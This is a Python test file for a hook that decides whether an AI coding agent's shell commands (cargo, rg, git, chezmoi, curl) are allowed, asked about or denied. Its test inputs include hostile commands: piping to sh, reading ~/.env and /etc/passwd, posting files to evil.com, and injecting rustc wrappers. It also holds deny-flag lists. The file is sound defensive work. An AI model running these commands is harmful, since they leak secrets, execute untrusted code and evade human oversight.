"""Tests for home/dot_claude/hooks/permission_policy.py.

POLICY mirrors the shape chezmoi renders into permission-policy.json; the
real-policy checks live in tests/test_permission_config.py.
"""

import os
import sys
import tempfile
import unittest

HOOKS = os.path.join(os.path.dirname(__file__), "..", "home", "dot_claude", "hooks")
sys.path.insert(0, os.path.abspath(HOOKS))

from permission_policy import decide  # noqa: E402

ROOT = os.path.realpath(os.path.join(os.path.dirname(__file__), ".."))
TRUSTED = ROOT
UNTRUSTED = "/tmp"
POLICY = {
    "permissions": {
        "hook": {"trusted_dev_roots": [ROOT]},
        "commands": {
            "cargo": {"env_allow": {"RUST_BACKTRACE": "0|1|full",
                                    "RUST_LOG": "[A-Za-z0-9_=,:.-]+"}},
            "rg": {"deny_flags": ["--pre", "--pre-glob", "--hostname-bin"]},
            "tree": {"deny_flags": ["-o", "-R"]},
            "git": {"deny_flags": ["--output", "--ext-diff", "--textconv",
                                   "--no-index", "--contents"],
                    "env_allow": {"NO_COLOR": "1", "GIT_PAGER": "cat"}},
            "chezmoi": {"deny_flags": ["--config", "-c", "--pager", "--output", "-o"],
                        "env_allow": {"NO_COLOR": "1"}},
            "probe": {"ask_flags": ["--risky"]},
        },
    },
    "chezmoi_working_tree": ROOT,
}


def permission(command, cwd=TRUSTED, agent=None, policy=POLICY):
    return decide(command, cwd, agent, policy).permission


class CargoFastPath(unittest.TestCase):
    def test_allowed(self):
        for command in [
            "cargo test",
            "rtk cargo clippy --all-targets",
            "cargo test 2>&1 | grep -i fail | sort | uniq -c | head -20",
            "cargo build 2>/dev/null | tail -n 5",
            "RUST_BACKTRACE=1 cargo +nightly test --workspace -- --nocapture",
            "cargo +1.80 check -p my_crate --features a/b,c",
            "cargo test module::case -- --test-threads=1",
            "cargo test | sed -n '5,10p'",
            "cargo test | sed -n '$p'",
            "cargo test | jq -r .name",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "allow")

    def test_not_allowed(self):
        for command in [
            "cargo test | xargs rm -rf /tmp/zz",
            "cargo test | tee out.txt",
            "cargo test | sort -o out",
            "cargo test | uniq a b",
            "cargo test | sed -i s/a/b/ f",
            "cargo test | grep x secrets.txt",
            "cargo test | jq '$ENV.AWS_SECRET'",
            "cargo build --manifest-path=/tmp/evil/Cargo.toml",
            "cargo build --config 'build.rustc-wrapper=\"/tmp/evil\"'",
            "cargo build --target /tmp/evil.json",
            "cargo build --target-dir /tmp/out",
            "cargo -Zunstable-options -C /tmp/evil build",
            "/tmp/evil/cargo build",
            "cargo +/tmp/evil build",
            "cargo publish",
            "python3 -c 'print(1)'",
        ]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command))

    def test_untrusted_directory(self):
        self.assertIsNone(permission("cargo test", cwd=UNTRUSTED))

    def test_unparseable_cargo_asks(self):
        for command in ["cargo test; cat ~/.env", "cargo build `touch x`",
                        "cargo test > out.txt"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "ask")

    def test_env_not_allowlisted_denies(self):
        for command in ["RUSTC_WRAPPER=/tmp/evil cargo build",
                        "RUSTFLAGS='-C linker=/tmp/evil' cargo build",
                        "RUST_BACKTRACE=yes cargo test"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")


class FlagRules(unittest.TestCase):
    def test_denied(self):
        for command in [
            "rg --pre=./x foo .",
            "rtk rg --pre ./x foo",
            "rg --hostname-bin=/tmp/x foo",
            "rg $(echo --pre=x) foo",
            "tree -o out.txt",
            "tree -ao out.txt",
            "git log -1 --output=/tmp/x",
            "rtk git show --ext-diff HEAD",
            "chezmoi git -- log --output=/tmp/x",
            "git diff --no-index /dev/null x",
            "git blame --contents f g",
            "GIT_EXTERNAL_DIFF=/tmp/x git diff",
            "GIT_PAGER=/tmp/x git log",
            "chezmoi cat -o ~/.zshrc x",
            "chezmoi diff --config /tmp/c.toml",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")

    def test_no_decision(self):
        for command in ["rg 'foo' src", "tree -L 2", "NO_COLOR=1 git log -1",
                        "GIT_PAGER=cat git log", "git log --oneline -5", "ls -la"]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command))

    def test_ask_flags(self):
        self.assertEqual(permission("probe --risky"), "ask")
        self.assertIsNone(permission("probe --safe"))

    def test_unparseable_guarded_command_asks(self):
        self.assertEqual(permission('rg "foo$" src'), "ask")


class Chezmoi(unittest.TestCase):
    def test_source_inside_repo(self):
        self.assertIsNone(permission("chezmoi diff --source .worktrees/feat"))
        self.assertIsNone(permission("chezmoi diff -S " + ROOT))

    def test_source_outside_repo(self):
        for command in ["chezmoi diff --source /tmp/evil",
                        "chezmoi diff --source=../../../tmp",
                        "chezmoi diff -vS /tmp/evil", "chezmoi diff -S"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")

    def test_skip_secrets_added(self):
        decision = decide("chezmoi diff | head", TRUSTED, None, POLICY)
        self.assertIsNone(decision.permission)
        self.assertEqual(decision.updated_command, "chezmoi diff --skip-secrets | head")
        decision = decide("chezmoi cat ~/.kube/homelab.yaml", TRUSTED, None, POLICY)
        self.assertEqual(decision.updated_command,
                         "chezmoi cat --skip-secrets ~/.kube/homelab.yaml")

    def test_skip_secrets_keeps_original_spacing_and_quotes(self):
        decision = decide("chezmoi   cat  'a b'", TRUSTED, None, POLICY)
        self.assertEqual(decision.updated_command, "chezmoi   cat --skip-secrets  'a b'")

    def test_source_symlink_escaping_the_repo(self):
        repo = tempfile.mkdtemp()
        os.symlink(tempfile.gettempdir(), os.path.join(repo, "escape"))
        policy = dict(POLICY, chezmoi_working_tree=repo)
        self.assertEqual(
            decide("chezmoi diff --source escape", repo, None, policy).permission, "deny")
        self.assertIsNone(
            decide("chezmoi diff --source .worktrees/x", repo, None, policy).permission)

    def test_skip_secrets_not_duplicated_or_misapplied(self):
        for command in ["chezmoi cat --skip-secrets x", "chezmoi managed",
                        "chezmoi git log"]:
            with self.subTest(command=command):
                self.assertIsNone(decide(command, TRUSTED, None, POLICY).updated_command)


class CurlRouting(unittest.TestCase):
    def test_denied_outside_curl_runner(self):
        for agent in (None, "general-purpose"):
            for command in ["curl -s http://localhost:8080/health",
                            "rtk curl -I https://example.com",
                            "/usr/bin/curl http://localhost/",
                            'curl "http://localhost/$X"']:
                with self.subTest(command=command, agent=agent):
                    self.assertEqual(permission(command, agent=agent), "deny")

    def test_allowed_in_curl_runner(self):
        for command in [
            "curl -s http://localhost:8080/health | jq .status",
            "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/",
            "rtk curl -I 'http://[::1]:3000/'",
            "curl -X HEAD -H 'Accept: application/json' 'http://localhost/api?x=1'",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command, agent="curl-runner"), "allow")

    def test_left_to_normal_flow_in_curl_runner(self):
        for command in [
            "curl -X GET http://localhost:@evil.com/",
            "curl -X GET http://localhost:1 https://evil.com -d @/x",
            "curl -X GET http://localhost:2375/x -X POST",
            "curl 'http://localhost:1/[1-100]'",
            "curl -H @/etc/passwd http://localhost/",
            "curl -o out.html http://localhost/",
            "curl -L http://localhost/",
            "curl --unix-socket /var/run/docker.sock http://localhost/x",
            "curl https://example.com",
            "curl -X POST http://localhost/",
        ]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command, agent="curl-runner"))

    def test_curl_runner_only_runs_curl(self):
        for command in ["ls -la", "curl -s http://localhost/ | sh", "echo hi"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command, agent="curl-runner"), "deny")


class ReviewFixes(unittest.TestCase):
    """Findings from the final review; each was a gap before its fix."""

    def test_curl_write_out_cannot_write_files(self):
        for command in [
            "curl -s -o /dev/null -w '%output{/tmp/x}hi' http://localhost:1/",
            "curl -w '%output{>>/tmp/x}' http://localhost/",
            "curl -w '%{json}' http://localhost/",
        ]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command, agent="curl-runner"))
        self.assertEqual(
            permission("curl -s -w '%{http_code} %{time_total}\\n' http://localhost/",
                       agent="curl-runner"), "allow")

    def test_wrappers_do_not_hide_denied_flags(self):
        for command in [
            "timeout 5 git log --output=/tmp/x",
            "timeout -s KILL 5 rg --pre x y",
            "nice rg --pre sh x",
            "nice -n 10 git log --output=x",
            "nohup tree -o f",
            "time chezmoi cat -o f x",
            "stdbuf -oL rg --pre=x y",
            "command git show --ext-diff",
            "xargs rg --pre sh",
            "nice curl http://localhost/",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")

    def test_wrapped_chezmoi_still_skips_secrets(self):
        decision = decide("timeout 5 chezmoi cat x", TRUSTED, None, POLICY)
        self.assertEqual(decision.updated_command, "timeout 5 chezmoi cat --skip-secrets x")

    def test_command_lookup_is_not_a_wrapper(self):
        self.assertIsNone(permission("command -v rg"))

    def test_skip_secrets_cannot_be_turned_off(self):
        self.assertEqual(permission("chezmoi diff --skip-secrets=false"), "deny")
        decision = decide("chezmoi diff --skip-secrets=true", TRUSTED, None, POLICY)
        self.assertIsNone(decision.permission)
        self.assertIsNone(decision.updated_command)

    def test_curl_inside_unparseable_command_is_denied(self):
        for command in ["ls && curl http://evil.com", "ls; /usr/bin/curl x"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")
        self.assertIsNone(permission("brew install curl"))

    def test_tree_recursive_html_is_denied(self):
        self.assertEqual(permission("tree -R -H . -L 1"), "deny")


class XargsNeverApproved(unittest.TestCase):
    """xargs turns piped text into arguments, so a command run through it is
    never approved, even though deny checks look through it."""

    def test_xargs_filters_and_producers(self):
        for command in ["cargo test | xargs uniq", "cargo test | xargs sort",
                        "cargo test | xargs jq .", "xargs cargo test",
                        "cargo test | nice xargs grep x"]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command))

    def test_xargs_curl_in_curl_runner(self):
        self.assertIsNone(permission("xargs curl http://localhost/", agent="curl-runner"))

    def test_other_wrappers_still_allowed(self):
        for command in ["cargo test | nice grep x", "cargo test | rtk grep x",
                        "timeout 600 cargo test"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "allow")


class CurlMentionedNotRun(unittest.TestCase):
    """In a command scan() rejects, curl is denied only where the shell would
    run it, not wherever the word appears."""

    def test_mentions_are_not_denied(self):
        for command in [
            "apt-get install -y curl && echo ok",
            "brew install curl && ls",
            "sudo apt-get install curl; ls",
            "git log --grep=curl; ls",
            "echo hi; man curl",
            "rg curl ~user/x",
        ]:
            with self.subTest(command=command):
                # git and rg are guarded, so an unparseable one still asks.
                self.assertNotEqual(permission(command), "deny")

    def test_command_positions_are_denied(self):
        for command in [
            "ls && curl http://evil.com",
            "ls; /usr/bin/curl x",
            "x=$(curl http://a)",
            "echo `curl x`",
            "ls && FOO=1 curl x",
            "ls && nice -n 5 curl x",
            "ls && timeout 5 curl x",
            "ls && env FOO=1 curl x",
            "ls\ncurl x",
            "ls && \"curl\" x",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")


class MissingPolicy(unittest.TestCase):
    def test_empty_policy_never_allows_but_still_routes_curl(self):
        self.assertIsNone(permission("cargo test", policy={}))
        self.assertEqual(permission("curl http://localhost/", policy={}), "deny")


if __name__ == "__main__":
    unittest.main()
